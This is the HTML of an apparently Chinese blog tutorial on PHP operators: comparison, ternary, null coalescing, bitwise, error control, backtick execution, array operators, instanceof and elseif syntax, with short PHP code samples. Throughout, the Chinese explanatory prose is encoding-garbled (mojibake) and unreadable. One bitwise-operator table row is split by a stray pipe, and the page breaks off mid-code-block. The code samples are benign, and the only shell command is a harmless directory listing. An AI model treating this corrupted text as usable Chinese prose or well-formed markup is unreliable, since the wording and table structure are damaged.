<h3 id="æ¯”è¾ƒè¿ç®—"><a href="#æ¯”è¾ƒè¿ç®—" class="headerlink" title="æ¯”è¾ƒè¿ç®—"></a>æ¯”è¾ƒè¿ç®—</h3><p>æ³¨æ„ <code>==</code> å’Œ <code>===</code> çš„åŒºåˆ«ã€‚</p>
<p>ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼Œ$a &lt;&gt; $b ä¸ $a != $b è¡¨ç¤ºç›¸åŒçš„æ„æ€ã€‚$a &lt;=&gt; $bæ˜¯ç»“åˆæ¯”è¾ƒè¿ç®—ç¬¦ï¼Œå½“$aå°äºã€ç­‰äºã€å¤§äº$bæ—¶åˆ†åˆ«è¿”å›ä¸€ä¸ªå°äºã€ç­‰äºã€å¤§äº0çš„<a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a> å€¼ã€‚ PHP7å¼€å§‹æä¾›ã€‚</p>
<p><strong>å¤šç±»å‹æ¯”è¾ƒï¼ˆæŒ‰é¡ºåºï¼‰</strong></p>
<table>
<thead>
<tr>
<th align="left">è¿ç®—æ•° 1 ç±»å‹</th>
<th align="left">è¿ç®—æ•° 2 ç±»å‹</th>
<th align="left">ç»“æœ</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.null.php" target="_blank" rel="noopener">null</a> æˆ– <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td>
<td align="left">å°† <strong><code>NULL</code></strong> è½¬æ¢ä¸º â€œâ€ï¼Œè¿›è¡Œæ•°å­—æˆ–è¯æ±‡æ¯”è¾ƒ</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">bool</a> æˆ– <a href="https://www.php.net/manual/zh/language.types.null.php" target="_blank" rel="noopener">null</a></td>
<td align="left">ä»»ä½•å…¶å®ƒç±»å‹</td>
<td align="left">è½¬æ¢ä¸º <a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">bool</a>ï¼Œ**<code>FALSE</code>** &lt; <strong><code>TRUE</code></strong></td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a></td>
<td align="left">å†…ç½®ç±»å¯ä»¥å®šä¹‰è‡ªå·±çš„æ¯”è¾ƒï¼Œä¸åŒç±»ä¸èƒ½æ¯”è¾ƒï¼Œç›¸åŒç±»å’Œæ•°ç»„åŒæ ·æ–¹å¼æ¯”è¾ƒå±æ€§ï¼ˆPHP 4 ä¸­ï¼‰ï¼ŒPHP 5 æœ‰å…¶è‡ªå·±çš„<a href="https://www.php.net/manual/zh/language.oop5.object-comparison.php" target="_blank" rel="noopener">è¯´æ˜</a></td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a>ï¼Œ<a href="https://www.php.net/manual/zh/language.types.resource.php" target="_blank" rel="noopener">resource</a> æˆ– <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.number" target="_blank" rel="noopener">number</a></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a>ï¼Œ<a href="https://www.php.net/manual/zh/language.types.resource.php" target="_blank" rel="noopener">resource</a> æˆ– <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.number" target="_blank" rel="noopener">number</a></td>
<td align="left">å°†å­—ç¬¦ä¸²å’Œèµ„æºè½¬æ¢æˆæ•°å­—ï¼ŒæŒ‰æ™®é€šæ•°å­¦æ¯”è¾ƒ</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a></td>
<td align="left">å…·æœ‰è¾ƒå°‘æˆå‘˜çš„æ•°ç»„è¾ƒå°ï¼Œå¦‚æœè¿ç®—æ•° 1 ä¸­çš„é”®ä¸å­˜åœ¨äºè¿ç®—æ•° 2 ä¸­åˆ™æ•°ç»„æ— æ³•æ¯”è¾ƒï¼Œå¦åˆ™æŒ¨ä¸ªå€¼æ¯”è¾ƒï¼ˆè§ä¸‹ä¾‹ï¼‰</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a></td>
<td align="left">ä»»ä½•å…¶å®ƒç±»å‹</td>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a> æ€»æ˜¯æ›´å¤§</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a></td>
<td align="left">ä»»ä½•å…¶å®ƒç±»å‹</td>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a> æ€»æ˜¯æ›´å¤§</td>
</tr>
</tbody></table>
<p>æ³¨æ„ï¼ç”±äºç”±äºæµ®ç‚¹æ•° <a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a> çš„å†…éƒ¨è¡¨è¾¾æ–¹å¼ï¼Œä¸åº”æ¯”è¾ƒä¸¤ä¸ªæµ®ç‚¹æ•°<a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a>æ˜¯å¦ç›¸ç­‰ã€‚æ›´å¤šä¿¡æ¯å‚è§ <a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a>ã€‚</p>
<h3 id="ä¸‰ç›®è¿ç®—"><a href="#ä¸‰ç›®è¿ç®—" class="headerlink" title="ä¸‰ç›®è¿ç®—"></a>ä¸‰ç›®è¿ç®—</h3><p>è¡¨è¾¾å¼ <em>(expr1) ? (expr2) : (expr3)</em> åœ¨ expr1 æ±‚å€¼ä¸º <strong><code>TRUE</code></strong> æ—¶çš„å€¼ä¸º expr2ï¼Œåœ¨ expr1 æ±‚å€¼ä¸º <strong><code>FALSE</code></strong> æ—¶çš„å€¼ä¸º expr3ã€‚</p>
<p>è‡ª PHP 5.3 èµ·ï¼Œå¯ä»¥çœç•¥ä¸‰å…ƒè¿ç®—ç¬¦ä¸­é—´é‚£éƒ¨åˆ†ã€‚è¡¨è¾¾å¼ <em>expr1 ?: expr3</em> åœ¨ expr1 æ±‚å€¼ä¸º <strong><code>TRUE</code></strong> æ—¶è¿”å› expr1ï¼Œå¦åˆ™è¿”å› expr3ã€‚</p>
<p>æ³¨æ„ä¸‰å…ƒè¿ç®—ç¬¦æ˜¯ä¸ªè¯­å¥ï¼Œå› æ­¤å…¶æ±‚å€¼ä¸æ˜¯å˜é‡ï¼Œè€Œæ˜¯è¯­å¥çš„ç»“æœã€‚åœ¨ä¸€ä¸ªé€šè¿‡å¼•ç”¨è¿”å›çš„å‡½æ•°ä¸­è¯­å¥ <em>return $var == 42 ? $a : $b;</em> å°†ä¸èµ·ä½œç”¨ï¼Œä»¥åçš„ PHP ç‰ˆæœ¬ä¼šä¸ºæ­¤å‘å‡ºä¸€æ¡è­¦å‘Šã€‚</p>
<h3 id="NULLåˆå¹¶è¿ç®—"><a href="#NULLåˆå¹¶è¿ç®—" class="headerlink" title="NULLåˆå¹¶è¿ç®—"></a>NULLåˆå¹¶è¿ç®—</h3><p>å½“ expr1 ä¸º **<code>NULL</code>**ï¼Œè¡¨è¾¾å¼ <em>(expr1) ?? (expr2)</em> ç­‰åŒäº expr2ï¼Œå¦åˆ™ä¸º expr1ã€‚</p>
<p>å°¤å…¶è¦æ³¨æ„ï¼Œå½“ä¸å­˜åœ¨å·¦ä¾§çš„å€¼æ—¶ï¼Œæ­¤è¿ç®—ç¬¦ä¹Ÿå’Œ <a href="https://www.php.net/manual/zh/function.isset.php" target="_blank" rel="noopener">isset()</a> ä¸€æ ·ä¸ä¼šäº§ç”Ÿè­¦å‘Šã€‚ å¯¹äº array é”®å°¤å…¶æœ‰ç”¨ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// NULL åˆå¹¶è¿ç®—ç¬¦çš„ä¾‹å­</span></span><br><span class="line">$action = $_POST[<span class="string">'action'</span>] ?? <span class="string">'default'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»¥ä¸Šä¾‹å­ç­‰åŒäºäºä»¥ä¸‹ if/else è¯­å¥</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    $action = $_POST[<span class="string">'action'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action = <span class="string">'default'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ³¨æ„NULL åˆå¹¶è¿ç®—ç¬¦æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œäº§ç”Ÿçš„ä¹Ÿæ˜¯è¡¨è¾¾å¼ç»“æœï¼Œè€Œä¸æ˜¯å˜é‡ã€‚åœ¨è¿”å›å¼•ç”¨çš„å‡½æ•°é‡Œå°±æ— æ³•ä½¿ç”¨è¿™æ ·çš„è¯­å¥ï¼š*return $foo ?? $bar;*ï¼Œè¿˜ä¼šæç¤ºè­¦å‘Šã€‚</p>
<p>NULL åˆå¹¶è¿ç®—ç¬¦æ”¯æŒç®€å•çš„åµŒå¥—ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$foo = <span class="keyword">null</span>;</span><br><span class="line">$bar = <span class="keyword">null</span>;</span><br><span class="line">$baz = <span class="number">1</span>;</span><br><span class="line">$qux = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $foo ?? $bar ?? $baz ?? $qux; <span class="comment">// è¾“å‡º 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="ç®—æ•°è¿ç®—"><a href="#ç®—æ•°è¿ç®—" class="headerlink" title="ç®—æ•°è¿ç®—"></a>ç®—æ•°è¿ç®—</h3><p>é™¤äº†åŠ å‡ä¹˜é™¤å–æ¨¡å¤–è¿˜æœ‰ï¼šå–åï¼š<code>-$x</code> ï¼Œå¹¶ç½®ï¼š<code>$a.$b</code>ã€‚</p>
<p>å–åæ˜¯å–ç›¸åæ•°ï¼Œå¹¶ç½®æ˜¯è¿æ¥ä¸¤ä¸ªå­—ç¬¦ä¸²ã€‚</p>
<p>å–åä¼šå…ˆå°†å¾…å–åçš„å˜é‡è½¬æ¢ä¸ºæ•°å€¼çš„å½¢å¼ã€‚</p>
<h3 id="èµ‹å€¼è¿ç®—"><a href="#èµ‹å€¼è¿ç®—" class="headerlink" title="èµ‹å€¼è¿ç®—"></a>èµ‹å€¼è¿ç®—</h3><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚æ³¨æ„ $a .= $b å’Œ $a = $a . $b è¡¨ç¤ºçš„æ„æ€ç›¸åŒã€‚</p>
<h3 id="é€’å¢é€’å‡"><a href="#é€’å¢é€’å‡" class="headerlink" title="é€’å¢é€’å‡"></a>é€’å¢é€’å‡</h3><p>x++, ++x, xâ€“, â€“xã€‚</p>
<h3 id="é€»è¾‘è¿ç®—"><a href="#é€»è¾‘è¿ç®—" class="headerlink" title="é€»è¾‘è¿ç®—"></a>é€»è¾‘è¿ç®—</h3><p>andä¸ / oræˆ–  /xorå¼‚æˆ– / &amp;&amp;ä¸ / ||æˆ– / !éã€‚</p>
<h3 id="ä½è¿ç®—"><a href="#ä½è¿ç®—" class="headerlink" title="ä½è¿ç®—"></a>ä½è¿ç®—</h3><table>
<thead>
<tr>
<th align="left">ä¾‹å­</th>
<th align="left">åç§°</th>
<th align="left">ç»“æœ</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong><code>$a &amp; $b</code></strong></td>
<td align="left">Andï¼ˆæŒ‰ä½ä¸ï¼‰</td>
<td align="left">å°†æŠŠ $a å’Œ $b ä¸­éƒ½ä¸º 1 çš„ä½è®¾ä¸º 1ã€‚</td>
</tr>
<tr>
<td align="left">**`$a</td>
<td align="left">$b`**</td>
<td align="left">Orï¼ˆæŒ‰ä½æˆ–ï¼‰</td>
</tr>
<tr>
<td align="left"><strong><code>$a ^ $b</code></strong></td>
<td align="left">Xorï¼ˆæŒ‰ä½å¼‚æˆ–ï¼‰</td>
<td align="left">å°†æŠŠ $a å’Œ $b ä¸­ä¸€ä¸ªä¸º 1 å¦ä¸€ä¸ªä¸º 0 çš„ä½è®¾ä¸º 1ã€‚</td>
</tr>
<tr>
<td align="left"><strong><code>~ $a</code></strong></td>
<td align="left">Notï¼ˆæŒ‰ä½å–åï¼‰</td>
<td align="left">å°† $a ä¸­ä¸º 0 çš„ä½è®¾ä¸º 1ï¼Œåä¹‹äº¦ç„¶ã€‚</td>
</tr>
<tr>
<td align="left"><strong><code>$a &lt;&lt; $b</code></strong></td>
<td align="left">Shift leftï¼ˆå·¦ç§»ï¼‰</td>
<td align="left">å°† $a ä¸­çš„ä½å‘å·¦ç§»åŠ¨ $b æ¬¡ï¼ˆæ¯ä¸€æ¬¡ç§»åŠ¨éƒ½è¡¨ç¤ºâ€œä¹˜ä»¥ 2â€ï¼‰ã€‚</td>
</tr>
<tr>
<td align="left"><strong><code>$a &gt;&gt; $b</code></strong></td>
<td align="left">Shift rightï¼ˆå³ç§»ï¼‰</td>
<td align="left">å°† $a ä¸­çš„ä½å‘å³ç§»åŠ¨ $b æ¬¡ï¼ˆæ¯ä¸€æ¬¡ç§»åŠ¨éƒ½è¡¨ç¤ºâ€œé™¤ä»¥ 2â€ï¼‰ã€‚</td>
</tr>
</tbody></table>
<p>ä½ç§»åœ¨ PHP ä¸­æ˜¯æ•°å­¦è¿ç®—ã€‚å‘ä»»ä½•æ–¹å‘ï¼ˆå·¦å³ï¼‰ç§»å‡ºå»çš„ä½éƒ½è¢«ä¸¢å¼ƒã€‚å·¦ç§»æ—¶å³ä¾§ä»¥é›¶å¡«å……ï¼Œ<strong>ç¬¦å·ä½è¢«ç§»èµ°æ„å‘³ç€æ­£è´Ÿå·ä¸è¢«ä¿ç•™ã€‚</strong>å³ç§»æ—¶å·¦ä¾§ä»¥ç¬¦å·ä½å¡«å……ï¼Œæ„å‘³ç€æ­£è´Ÿå·è¢«ä¿ç•™ã€‚</p>
<p>è‹¥&amp;ï¼Œ/ï¼Œ^å·¦å³æ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™å¯¹ASCIIåšè¿ç®—ä»¥åå¾—åˆ°å­—ç¬¦ä¸²ç»“æœï¼Œå¯¹äºå…¶å®ƒç±»å‹å…¨éƒ¨è½¬æˆIntegerï¼Œå¾—åˆ°Integerç»“æœã€‚~æ“ä½œåŒç†ã€‚&lt;&lt;å’Œ&gt;&gt;å·¦å³ä¸¤è¾¹éƒ½è¢«å½“ä½œ Integer å¤„ç†ï¼ŒStringä¹Ÿä¸ä¼šè½¬æˆASCIIã€‚</p>
<p>PHP çš„ ini è®¾å®š error_reporting ä½¿ç”¨äº†æŒ‰ä½çš„å€¼ï¼Œæä¾›äº†å…³é—­æŸä¸ªä½çš„å®ä¾‹ã€‚</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">E_ALL ^ E_NOTICE</span><br><span class="line">å…·ä½“è¿ä½œæ–¹å¼æ˜¯å…ˆå–å¾— E_ALL çš„å€¼ï¼š</span><br><span class="line"><span class="number">00000000000000000111011111111111</span></span><br><span class="line">å†å–å¾— E_NOTICE çš„å€¼ï¼š</span><br><span class="line"><span class="number">00000000000000000000000000001000</span></span><br><span class="line">æœ€åå†ç”¨^å¾—åˆ°ä¸¤ä¸ªå€¼ä¸­éƒ½è®¾å®šäº†ï¼ˆä¸º <span class="number">1</span>ï¼‰çš„ä½ï¼š</span><br><span class="line"><span class="number">00000000000000000111011111110111</span></span><br></pre></td></tr></table></figure>

<h3 id="é”™è¯¯æ§åˆ¶è¿ç®—"><a href="#é”™è¯¯æ§åˆ¶è¿ç®—" class="headerlink" title="é”™è¯¯æ§åˆ¶è¿ç®—"></a>é”™è¯¯æ§åˆ¶è¿ç®—</h3><p>@ç¬¦å·ã€‚å½“å°†å…¶æ”¾ç½®åœ¨ä¸€ä¸ª PHP è¡¨è¾¾å¼ä¹‹å‰ï¼Œè¯¥è¡¨è¾¾å¼å¯èƒ½äº§ç”Ÿçš„ä»»ä½•é”™è¯¯ä¿¡æ¯éƒ½è¢«å¿½ç•¥æ‰ã€‚</p>
<p>å¦‚æœç”¨ <a href="https://www.php.net/manual/zh/function.set-error-handler.php" target="_blank" rel="noopener">set_error_handler()</a> è®¾å®šäº†è‡ªå®šä¹‰çš„é”™è¯¯å¤„ç†å‡½æ•°ï¼Œä»ç„¶ä¼šè¢«è°ƒç”¨ï¼Œä½†æ˜¯æ­¤é”™è¯¯å¤„ç†å‡½æ•°å¯ä»¥ï¼ˆå¹¶ä¸”ä¹Ÿåº”è¯¥ï¼‰è°ƒç”¨ <a href="https://www.php.net/manual/zh/function.error-reporting.php" target="_blank" rel="noopener">error_reporting()</a>ï¼Œè€Œè¯¥å‡½æ•°åœ¨å‡ºé”™è¯­å¥å‰æœ‰ @ æ—¶å°†è¿”å› 0ã€‚</p>
<p>å¦‚æœæ¿€æ´»äº† <a href="https://www.php.net/manual/zh/errorfunc.configuration.php#ini.track-errors" target="_blank" rel="noopener"><strong>track_errors</strong></a> ç‰¹æ€§ï¼Œè¡¨è¾¾å¼æ‰€äº§ç”Ÿçš„ä»»ä½•é”™è¯¯ä¿¡æ¯éƒ½è¢«å­˜æ”¾åœ¨å˜é‡ <a href="https://www.php.net/manual/zh/reserved.variables.phperrormsg.php" target="_blank" rel="noopener"><strong>$php_errormsg</strong></a> ä¸­ã€‚æ­¤å˜é‡åœ¨æ¯æ¬¡å‡ºé”™æ—¶éƒ½ä¼šè¢«è¦†ç›–ï¼Œæ‰€ä»¥å¦‚æœæƒ³ç”¨å®ƒçš„è¯å°±è¦å°½æ—©æ£€æŸ¥ã€‚</p>
<h3 id="æ‰§è¡Œè¿ç®—"><a href="#æ‰§è¡Œè¿ç®—" class="headerlink" title="æ‰§è¡Œè¿ç®—"></a>æ‰§è¡Œè¿ç®—</h3><p>åå¼•å·ï¼ˆ``ï¼‰ã€‚PHP å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›ï¼ˆå³ï¼Œå¯ä»¥èµ‹ç»™ä¸€ä¸ªå˜é‡è€Œä¸æ˜¯ç®€å•åœ°ä¸¢å¼ƒåˆ°æ ‡å‡†è¾“å‡ºï¼‰ã€‚ä½¿ç”¨åå¼•å·è¿ç®—ç¬¦çš„æ•ˆæœä¸å‡½æ•° <a href="https://www.php.net/manual/zh/function.shell-exec.php" target="_blank" rel="noopener">shell_exec()</a> ç›¸åŒã€‚</p>
<p>æ³¨ï¼šexecå‘½ä»¤ï¼Œå¦‚æœæŒ‡å®šäº†commandï¼Œå®ƒå°±ä¼šå–ä»£å½“å‰çš„shellè€Œä¸æ˜¯åˆ›å»ºæ–°çš„è¿›ç¨‹ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$output = `ls -al`;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$output&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åå¼•å·è¿ç®—ç¬¦åœ¨æ¿€æ´»äº†<a href="https://www.php.net/manual/zh/ini.sect.safe-mode.php#ini.safe-mode" target="_blank" rel="noopener">å®‰å…¨æ¨¡å¼</a>æˆ–è€…å…³é—­äº† <a href="https://www.php.net/manual/zh/function.shell-exec.php" target="_blank" rel="noopener">shell_exec()</a> æ—¶æ˜¯æ— æ•ˆçš„ã€‚</p>
<p>ä¸å…¶å®ƒæŸäº›è¯­è¨€ä¸åŒï¼Œåå¼•å·ä¸èƒ½åœ¨åŒå¼•å·å­—ç¬¦ä¸²ä¸­ä½¿ç”¨ã€‚ä½†æ˜¯ï¼Œç”±å˜é‡æ­è½½åˆ™å¯ä»¥ä½¿ç”¨ï¼Œå¦‚ä¸Šä¾‹ã€‚</p>
<h3 id="æ•°ç»„è¿ç®—"><a href="#æ•°ç»„è¿ç®—" class="headerlink" title="æ•°ç»„è¿ç®—"></a>æ•°ç»„è¿ç®—</h3><table>
<thead>
<tr>
<th align="left">ä¾‹å­</th>
<th align="left">åç§°</th>
<th align="left">ç»“æœ</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$a + $b</td>
<td align="left">è”åˆ</td>
<td align="left">$a å’Œ $b çš„è”åˆã€‚</td>
</tr>
<tr>
<td align="left">$a == $b</td>
<td align="left">ç›¸ç­‰</td>
<td align="left">å¦‚æœ $a å’Œ $b å…·æœ‰ç›¸åŒçš„é”®ï¼å€¼å¯¹åˆ™ä¸º **<code>TRUE</code>**ã€‚</td>
</tr>
<tr>
<td align="left">$a === $b</td>
<td align="left">å…¨ç­‰</td>
<td align="left">å¦‚æœ $a å’Œ $b å…·æœ‰ç›¸åŒçš„é”®ï¼å€¼å¯¹å¹¶ä¸”é¡ºåºå’Œç±»å‹éƒ½ç›¸åŒåˆ™ä¸º **<code>TRUE</code>**ã€‚</td>
</tr>
<tr>
<td align="left">$a != $b</td>
<td align="left">ä¸ç­‰</td>
<td align="left">å¦‚æœ $a ä¸ç­‰äº $b åˆ™ä¸º **<code>TRUE</code>**ã€‚</td>
</tr>
<tr>
<td align="left">$a &lt;&gt; $b</td>
<td align="left">ä¸ç­‰</td>
<td align="left">å¦‚æœ $a ä¸ç­‰äº $b åˆ™ä¸º **<code>TRUE</code>**ã€‚</td>
</tr>
<tr>
<td align="left">$a !== $b</td>
<td align="left">ä¸å…¨ç­‰</td>
<td align="left">å¦‚æœ $a ä¸å…¨ç­‰äº $b åˆ™ä¸º **<code>TRUE</code>**ã€‚</td>
</tr>
</tbody></table>
<p><em>+</em> è¿ç®—ç¬¦æŠŠå³è¾¹çš„æ•°ç»„å…ƒç´ é™„åŠ åˆ°å·¦è¾¹çš„æ•°ç»„åé¢ï¼Œä¸¤ä¸ªæ•°ç»„ä¸­éƒ½æœ‰çš„é”®åï¼Œåˆ™åªç”¨å·¦è¾¹æ•°ç»„ä¸­çš„ï¼Œå³è¾¹çš„è¢«å¿½ç•¥ã€‚</p>
<h3 id="ç±»å‹è¿ç®—"><a href="#ç±»å‹è¿ç®—" class="headerlink" title="ç±»å‹è¿ç®—"></a>ç±»å‹è¿ç®—</h3><p><em>instanceof</em> ç”¨äºç¡®å®šä¸€ä¸ª PHP å˜é‡æ˜¯å¦å±äºæŸä¸€ç±»çš„å®ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotMyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> MyClass;</span><br><span class="line"></span><br><span class="line">var_dump($a <span class="keyword">instanceof</span> MyClass);   <span class="comment">//bool(true)</span></span><br><span class="line">var_dump($a <span class="keyword">instanceof</span> NotMyClass);   <span class="comment">//bool(false)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥ç”¨æ¥ç¡®å®šä¸€ä¸ªå˜é‡æ˜¯ä¸æ˜¯ç»§æ‰¿è‡ªæŸä¸€çˆ¶ç±»çš„å­ç±»çš„å®ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParentClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> <span class="keyword">extends</span> <span class="title">ParentClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> MyClass;</span><br><span class="line"></span><br><span class="line">var_dump($a <span class="keyword">instanceof</span> MyClass);</span><br><span class="line">var_dump($a <span class="keyword">instanceof</span> ParentClass);   <span class="comment">//bool(true)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç”¨ <code>!</code> æ£€æŸ¥å¯¹è±¡ä¸æ˜¯æŸä¸ªç±»çš„å®ä¾‹ã€‚</p>
<p>ä¹Ÿå¯ç”¨äºç¡®å®šä¸€ä¸ªå˜é‡æ˜¯ä¸æ˜¯å®ç°äº†æŸä¸ª<a href="https://www.php.net/manual/zh/language.oop5.interfaces.php" target="_blank" rel="noopener">æ¥å£</a>çš„å¯¹è±¡çš„å®ä¾‹ã€‚</p>
<p>è™½ç„¶ <em>instanceof</em> é€šå¸¸ç›´æ¥ä¸ç±»åä¸€èµ·ä½¿ç”¨ï¼Œä½†ä¹Ÿå¯ä»¥ä½¿ç”¨å¯¹è±¡æˆ–å­—ç¬¦ä¸²å˜é‡ã€‚</p>
<p>instanceof çš„ä½¿ç”¨è¿˜æœ‰ä¸€äº›é™·é˜±å¿…é¡»äº†è§£ã€‚åœ¨ PHP 5.1.0 ä¹‹å‰ï¼Œå¦‚æœè¦æ£€æŸ¥çš„ç±»åç§°ä¸å­˜åœ¨ï¼Œ<em>instanceof</em> ä¼šè°ƒç”¨ <a href="https://www.php.net/manual/zh/function.autoload.php" target="_blank" rel="noopener">__autoload()</a>ã€‚å¦å¤–ï¼Œå¦‚æœè¯¥ç±»æ²¡æœ‰è¢«è£…è½½åˆ™ä¼šäº§ç”Ÿä¸€ä¸ªè‡´å‘½é”™è¯¯ã€‚å¯ä»¥é€šè¿‡ä½¿ç”¨åŠ¨æ€ç±»å¼•ç”¨æˆ–ç”¨ä¸€ä¸ªåŒ…å«ç±»åçš„å­—ç¬¦ä¸²å˜é‡æ¥é¿å¼€è¿™ç§é—®é¢˜ã€‚</p>
<p><em>instanceof</em> è¿ç®—ç¬¦æ˜¯ PHP 5 å¼•è¿›çš„ã€‚åœ¨æ­¤ä¹‹å‰ç”¨ <a href="https://www.php.net/manual/zh/function.is-a.php" target="_blank" rel="noopener">is_a()</a>ï¼Œä½†æ˜¯åæ¥ <a href="https://www.php.net/manual/zh/function.is-a.php" target="_blank" rel="noopener">is_a()</a> è¢«åºŸå¼ƒè€Œç”¨ <em>instanceof</em> æ›¿ä»£äº†ã€‚æ³¨æ„è‡ª PHP 5.3.0 èµ·ï¼Œåˆæ¢å¤ä½¿ç”¨ <a href="https://www.php.net/manual/zh/function.is-a.php" target="_blank" rel="noopener">is_a()</a> äº†ã€‚å‚è§ <a href="https://www.php.net/manual/zh/function.get-class.php" target="_blank" rel="noopener">get_class()</a> å’Œ <a href="https://www.php.net/manual/zh/function.is-a.php" target="_blank" rel="noopener">is_a()</a>ã€‚</p>
<h2 id="æµç¨‹æ§åˆ¶"><a href="#æµç¨‹æ§åˆ¶" class="headerlink" title="æµç¨‹æ§åˆ¶"></a>æµç¨‹æ§åˆ¶</h2><h3 id="ä¸å¿…å¤šè¯´çš„"><a href="#ä¸å¿…å¤šè¯´çš„" class="headerlink" title="ä¸å¿…å¤šè¯´çš„"></a>ä¸å¿…å¤šè¯´çš„</h3><p>ifï¼Œelseï¼Œwhile, do while, for</p>
<h3 id="elseif-else-if"><a href="#elseif-else-if" class="headerlink" title="elseif/else if"></a>elseif/else if</h3><p>å¿…é¡»è¦æ³¨æ„çš„æ˜¯ <em>elseif</em> ä¸ <em>else if</em> åªæœ‰åœ¨ä½¿ç”¨èŠ±æ‹¬å·çš„æƒ…å†µä¸‹æ‰è®¤ä¸ºæ˜¯å®Œå…¨ç›¸åŒã€‚å¦‚æœç”¨å†’å·æ¥å®šä¹‰ <em>if</em>/<em>elseif</em> æ¡ä»¶ï¼Œé‚£å°±ä¸èƒ½ç”¨ä¸¤ä¸ªå•è¯çš„ <em>else if</em>ï¼Œå¦åˆ™ PHP ä¼šäº§ç”Ÿè§£æé”™è¯¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä¸æ­£ç¡®çš„ä½¿ç”¨æ–¹æ³•ï¼š */</span></span><br><span class="line"><span class="keyword">if</span> ($a &gt; $b):</span><br><span class="line">    <span class="keyword">echo</span> $a.<span class="string">" is greater than "</span>.$b;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($a == $b): <span class="comment">// å°†æ— æ³•ç¼–è¯‘</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"The above line causes a parse error."</span>;</span><br><span class="line"><span class="keyword">endif</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span 